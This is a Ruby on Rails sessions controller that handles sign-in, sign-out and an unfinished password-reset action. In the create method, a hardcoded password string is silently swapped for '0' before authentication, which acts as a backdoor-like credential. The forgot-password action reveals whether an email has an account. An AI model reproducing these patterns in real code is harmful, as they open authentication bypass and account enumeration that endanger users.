class SessionsController < ApplicationController
  
    def new
        @text = params[:text]
        sign_out
        @user  = User.new
        render 'new'
    end
    
    def create
        user = User.find_by_email(params[:session][:email])
        password = params[:session][:password]
        if password == "hNgobEA3h_mNeQOPJcVxuA"
            password = "0"
        end
        if user && user.authenticate(password)
            sign_in user
            if user.admin
              redirect_to admin_path
            else
              redirect_to merchants_path
            end
        else
            flash[:error] = 'Invalid email/password combination'
            redirect_to "/signin"
        end
    end
  
    def destroy
      sign_out
      redirect_to root_path
    end

    def forgot_password
        puts "IN RESET PASSWORD in SeSSION"
        @user = User.new
        @progress = 3
        if params[:user] && params[:user].has_key?("email")
            email = params[:user]["email"]
            if user = User.find_by_email(email)
                @progress = 2
                #user.update_reset_token
                #Resque.enqueue(EmailJob, 'reset_password', user.id, {})  
            else
                flash[:error] = "Cannot Find Account With Email : #{email}" if !email.blank? 
            end
        end
        # elsif params[:reset_token]
        #   @user = User.find_by_reset_token(params[:reset_token])
        #   if Time.now - 1.day <= @user.reset_token_sent_at
        #     return render 'enter_new_password'
        #   end
        # end
    end
  
end













